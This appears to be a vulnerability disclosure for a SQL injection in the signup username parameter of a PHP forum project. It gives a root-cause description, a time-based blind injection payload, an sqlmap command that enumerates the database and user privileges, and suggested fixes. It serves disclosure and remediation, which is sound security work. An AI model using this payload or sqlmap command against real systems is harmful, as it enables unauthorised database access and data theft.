# CVE
CVE-poc
### Issue Type

SQL Injection

## Root Cause

A SQL injection vulnerability has been identified in the /signuppost.php file in the “Technical Forum Using PHP Source Code” project. The vulnerability stems from the fact that an attacker can inject malicious code via the login username parameter and use that parameter directly in a SQL query without validation. This allows an attacker to spoof input values to manipulate SQL queries and perform unauthorized actions.

### Impact

An attacker can exploit this SQL injection vulnerability to gain unauthorized access to a database, disclose sensitive data, tamper with data, completely control the system, or even disrupt services, posing a serious threat to system security and business continuity.

## Vulnerability Details and POC

Vulnerability Name: Username Parameter

```
Payload
Parameter: Username (POST)
Type: Time Blind Injection Time Blind Injection
Title: Time Blind Injection Time Blind Injection
Payload: username=admin' AND (SELECT 9335 FROM (SELECT(SLEEP(5)))NwOL) AND 'SGvn' = 'SGvn'
Screenshot of the specific information obtained when testing and running the sqlmap utility
```
![image](https://github.com/user-attachments/assets/cbaf25e7-b4e1-41f7-9475-f14564b2810c)
```
//sqlmap
python sqlmap.py -r url.txt --level 1 --risk 1 --current-db --current-user --is-dba
```

### Suggested fixes

Using preprocessing statements and parameter binding
Preprocessing statements prevent SQL injection by separating the SQL code from the user input data. When using preprocessing statements, user-entered values are treated as pure data and are not interpreted as SQL code.

Input Validation and Filtering
Strictly validate and filter user input data to ensure that it conforms to the expected format.

Minimize Database User Privileges
Ensure that accounts used to connect to the database have the minimum necessary privileges. Avoid using accounts with higher privileges (e.g. “root” or “admin”) for day-to-day operations.

Conduct regular security audits
Conduct regular code and system security audits to identify and fix potential security vulnerabilities in a timely manner.

By following these recommendations, you can greatly improve the security of your applications and reduce the risks associated with SQL injection vulnerabilities.
